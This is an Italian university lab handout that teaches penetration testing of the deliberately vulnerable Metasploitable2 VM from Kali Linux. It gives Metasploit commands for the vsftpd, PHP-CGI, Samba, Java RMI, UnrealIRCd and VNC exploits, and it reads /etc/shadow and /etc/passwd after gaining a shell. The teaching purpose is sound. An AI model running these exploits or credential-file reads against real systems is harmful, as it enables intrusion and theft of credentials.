---
layout: default
title: Sfruttamento di vulnerabilita'
description: Prof.ssa Federica Paci
---
Gli attaccanti possono tentare di sfruttare una vulnerabilità in un host o sistema esposto a Internet per accedere inizialmente a una rete. La vulnerabilità nel sistema può essere un bug software, un guasto temporaneo o una configurazione errata.

Le applicazioni sfruttate sono spesso siti web/server web, ma possono includere anche database (come SQL), servizi standard (come SMB o SSH), protocolli di amministrazione e gestione dei dispositivi di rete (come SNMP e Smart Install) e qualsiasi altro sistema con socket aperti accessibili da Internet.

In questo laboratorio sfrutteremo vulnerabilità in un host per ottenere accesso. Uutilizzeremo la macchina virtuale **Kali Linux** e la macchina virtuale **Metasploitable2**. 

**Kali Linux** è una distribuzione Linux basata su Debian, progettata specificamente per la sicurezza informatica e il penetration testing. Sviluppata e mantenuta dall'azienda Offensive Security, Kali Linux è dotata di un vasto assortimento di strumenti preinstallati per eseguire una varietà di compiti legati alla sicurezza, come penetration testing, analisi di vulnerabilità, digital forensics e reverse engineering del codice. 

**Metasploitable 2** è una macchina virtuale vulnerabile, progettata intenzionalmente per essere utilizzata come target di attacchi in ambienti di test di sicurezza informatica. Sviluppata dal team di Rapid7, Metasploitable 2 serve come una piattaforma di apprendimento e pratica per i penetration tester e gli studenti di cybersecurity, permettendo loro di esplorare e testare tecniche di attacco in un ambiente controllato e sicuro.

Per sfruttare questa vulnerabilita' useremo **Metasploit**. Metasploit è un framework open-source utilizzato per il penetration testing e lo sviluppo di exploit, creato originariamente da H.D. Moore. Metasploit fornisce una vasta gamma di strumenti e risorse che permettono ai professionisti della sicurezza informatica di identificare, verificare e sfruttare le vulnerabilità nei sistemi informatici.

### Caratteristiche principali di Metasploit
* **Libreria di exploit**: Metasploit include una vasta raccolta di exploit preconfigurati che possono essere utilizzati per sfruttare vulnerabilità conosciute in software, sistemi operativi e applicazioni.

* **Payloads**: Metasploit permette agli utenti di scegliere diversi payload, ovvero il codice eseguito dopo che un exploit ha avuto successo. I payload possono variare da semplici comandi di sistema a interi interpreti come Meterpreter, che offre una shell avanzata con funzionalità di post-sfruttamento.

* **Auxiliary modules**: Oltre agli exploit, Metasploit include moduli ausiliari che possono essere utilizzati per eseguire una varietà di funzioni, come la scansione di rete, il fuzzing delle applicazioni e l'analisi delle vulnerabilità.

* **Post-exploitation**: Una volta che un sistema è stato compromesso, Metasploit offre una serie di strumenti per l'esecuzione di attività di post-sfruttamento, come la raccolta di informazioni, il movimento laterale e la persistenza.

Metasploit può essere utilizzato attraverso un'interfaccia a riga di comando (msfconsole). 

####  Sessione Meterpreter 

Alcuni degli exploit che utilizzeremo consentono di creare unasessione **Meterpreter**. E' una connessione stabilita tra un dispositivo compromesso e il framework **Metasploit**, utilizzata per eseguire comandi e interagire con il sistema operativo del dispositivo compromesso in modo remoto e non rilevabile. È una delle funzionalità più potenti di Metasploit, consentendo agli attaccanti di ottenere un controllo completo sul sistema compromesso.

##### Caratteristiche principali di una sessione Meterpreter:

* **Shell Interattiva**: Fornisce una shell interattiva che consente agli attaccanti di eseguire comandi direttamente sul sistema compromesso, simile a una shell di sistema operativo.

* **Funzionalità Avanzate**: Supporta un'ampia gamma di funzionalità avanzate, come l'upload e il download di file, la manipolazione del registro di sistema, la cattura dello schermo, la registrazione delle tastiere, e altro ancora.

* **Persistenza**: Meterpreter può essere utilizzato per ottenere e mantenere l'accesso persistente al sistema compromesso, consentendo agli attaccanti di tornare al sistema in futuro senza necessità di reinfezione.

* **Post-Esploitation**: È ideale per attività di post-sfruttamento, come il raccolto di informazioni sensibili, l'elevazione dei privilegi, il movimento laterale all'interno della rete, e l'installazione di altri strumenti di attacco.

* **Rilevabilità**: Le sessioni Meterpreter sono progettate per essere nascoste e non facilmente rilevabili, utilizzando tecniche come l'iniezione in processi legittimi e la crittografia delle comunicazioni.

**N.B** Prima di iniziare questa attivita' dobbiamo assicurarci che le due macchine virtuali siano collegate da una rete interna e abilitare l'account root sulla macchina Kali Linux.


# Abilitare account root su Kali Linux VM 

Aprite un terminale e digitate il seguente comando:

```
# sudo passwd
```
Vi verra' richiesto di inserire la password per l'utente root.

# Determinare indirizzo IP di Kali Linux e Metasploitable2

Aprite un terminale e digitate il seguente comando:

```
# ifconfig
```

# Scoprire le vulnerabilita' presenti in Metasploitable2

Per scoprire le vulnerabilita' utilizzeremo **Nmap**. Nmap è ampiamente utilizzato da amministratori di rete, professionisti della sicurezza informatica e hacker etici per identificare dispositivi attivi, scoprire servizi disponibili e rilevare vulnerabilità all'interno di una rete.

Aprite un terminale e digitate il seguente comando:

```
# nmap -sV --script vuln <INDIRIZZO IP METASPLOITABLE2>
```

# Sfruttamento di VSFTPD 2.3.4

VSFTPD (Very Secure FTP Daemon) è un server FTP comunemente utilizzato per la sua velocità e sicurezza. Tuttavia, la versione 2.3.4 di VSFTPD contiene una vulnerabilità critica che può essere sfruttata dagli attaccanti per ottenere accesso non autorizzato al sistema.

## Dettagli della vulnerabilità
La vulnerabilità in VSFTPD 2.3.4 riguarda un backdoor malevolo introdotto nel codice sorgente ufficiale. Quando un utente si connette al server FTP e fornisce una combinazione di nome utente che termina con ":)", il server apre una shell sulla porta 6200, permettendo all'attaccante di ottenere accesso remoto al sistema.

## Passi per sfruttare la vulnerabilita'

#### Avvio di Metasploit:
```
# msfconsole
```
#### Ricerca di un exploit:

```
# search vsftpd 2.3.4
```
#### Caricamento di un modulo di exploit:

```
# use exploit/unix/ftp/vsftpd_234_backdoor
```

#### Impostazione delle opzioni del payload:
```
# set RHOST <INDIRIZZO IP METASPLOITABLE2>
```

#### Esecuzione dell'exploit:

```
# run
```
Una volta aperta la shell remota create una copia del file contenenti le credenziali degli presenti sulla macchina Metasploitable2.

#### Copia file /etc/shadow
```
# cat /etc/shadow
```
#### Copia file /etc/passwd
```
# cat /etc/passwd
```

# Sfruttamento della vulnerabilità di PHP 2.4.2

Sappiamo che la porta 80 è aperta, quindi digitiamo l'indirizzo IP di Metasploitable2 nel nostro browser e notiamo che è in esecuzione PHP. Indagando un po' più a fondo, scopriamo quale versione di PHP è in esecuzione e notiamo anche che è eseguita come CGI. Ora sfrutteremo la vulnerabilità di iniezione degli argomenti di PHP 2.4.2 utilizzando Metasploit.

## Dettagli della vulnerabilità

La vulnerabilità di iniezione degli argomenti di PHP 2.4.2 su Metasploitable 2 è una falla di sicurezza che consente a un attaccante remoto di eseguire comandi arbitrari sul server web. Questa vulnerabilità è presente quando PHP è configurato per essere eseguito come CGI (Common Gateway Interface). L'attacco sfrutta un'errata gestione degli argomenti di input forniti a PHP attraverso l'URL.

## Passi per sfruttare la vulnerabilita'

```
# msfconsole
# search php cgi
# use exploit/multi/http/php_cgi_arg_injection
# set RHOST <INDIRIZZO IP METASPLOITABLE2>
# exploit
```
# Sfruttamento della vulnerabilità di Samba 3.0.20

Samba è una suite di software open-source che implementa il protocollo SMB (Server Message Block) per sistemi operativi non-Windows, consentendo loro di interagire in una rete Windows. Fondamentalmente, Samba facilita la condivisione di file e la stampa tra sistemi Windows e sistemi UNIX-like, come Linux e macOS. Sfruttiamo la vulnerabilità di esecuzione di comandi presente nella versione di Samba 3.0.20 quando viene utilizzata l'opzione di configurazione non predefinita "username map script".

## Dettagli della vulnerabilità
Specificando un nome utente che contiene caratteri meta della shell, gli attaccanti possono eseguire comandi arbitrari. Non è necessaria alcuna autenticazione per sfruttare questa vulnerabilità, poiché questa opzione è utilizzata per mappare i nomi utente prima dell'autenticazione.

## Passi per sfruttare la vulnerabilita'

```
# msfconsole
# search samba username map script
# use exploit/multi/samba/usermap_script
# set RHOST <INDIRIZZO IP METASPLOITABLE2>
# exploit
```
# Sfruttamento della porta 8080 (Java Remote Method Invocation)
Sfruttiamo la configurazione predefinita dei servizi RMI Registry e RMI Activation, che consentono il caricamento delle classi da qualsiasi URL remoto (HTTP). 

## Dettagli della vulnerabilità
Il sistema Java Remote Method Invocation (RMI) consente a un oggetto in esecuzione in una Java Virtual Machine di invocare metodi su un oggetto in esecuzione in un'altra Java Virtual Machine. Una delle caratteristiche del protocollo Java RMI è il caricamento remoto delle classi.
Sfrutteremo  una versione specifica del server Java RMI, con una configurazione predefinita non sicura, che permette il caricamento delle classi da qualsiasi URL remoto (HTTP) ed inoltre che non richieda alcuna autenticazione per caricare queste classi Java.

## Passi per sfruttare la vulnerabilita'

```
# msfconsole
# search java rmi server
# use exploit/multi/misc/java_rmi_server
# set RHOST <INDIRIZZO IP METASPLOITABLE2>
# exploit
```
# Sfruttamento vulnerabilita' presente in Unreal IRCD 3.2.8.1.

Sfruttiamo una backdoor malevola che è stata aggiunta all'archivio di download di Unreal IRCD 3.2.8.1. Questa backdoor era presente nell'archivio Unreal3.2.8.1.tar.gz tra novembre 2009 e il 12 giugno 2010.

## Dettagli della vulnerabilità
Il file Unreal3.2.8.1.tar.gz è stato sostituito con una versione contenente una backdoor (trojan). Questa backdoor consente a una persona di eseguire QUALUNQUE comando con i privilegi dell'utente che sta eseguendo l'ircd. La backdoor può essere eseguita indipendentemente da qualsiasi restrizione degli utenti (quindi anche se hai un server o un hub con password che non consente l'accesso agli utenti).

## Passi per sfruttare la vulnerabilita'

```
# msfconsole
# search Unreal 3.2.8.1
# use exploit/unix/irc/
# set RHOST <INDIRIZZO IP METASPLOITABLE2>
# exploit
```

# Sfruttamento vulnerabilita' presente nel servizio Virtual Network Computing 

Sfrutteremo la vulnerabilita' presente nel servizio VNC. VNC (Virtual Network Computing) è un sistema di condivisione del desktop remoto che consente agli utenti di controllare e operare un computer tramite una rete. Sebbene offra comodità e capacità di accesso remoto, presenta anche una potenziale vulnerabilità che gli attaccanti possono sfruttare.

## Dettagli della vulnerabilità

La vulnerabilita' presente e' che e' stata configurata una password debole.

## Passi per sfruttare la vulnerabilita'
Prima eseguiremo modulo che testerà il server VNC e riporterà i login riusciti. Attualmente, supporta le versioni del protocollo RFB 3.3, 3.7, 3.8 e 4.001 utilizzando il metodo di autenticazione challenge-response di VNC. 

```
# msfconsole
# search vnc login
# use auxiliary/scanner/vnc/vnc_login
# set RHOST <INDIRIZZO IP METASPLOITABLE2>
# exploit
```
Poi tenteremo di collegarci al server con le credenziali trovate.
```
# vncviewer <INDIRIZZO IP METASPLOITABLE2>
```
Si aprira' una finestra di remote desktop collegata alla macchina Metasploitable2. Provate a digitare qualche comando.
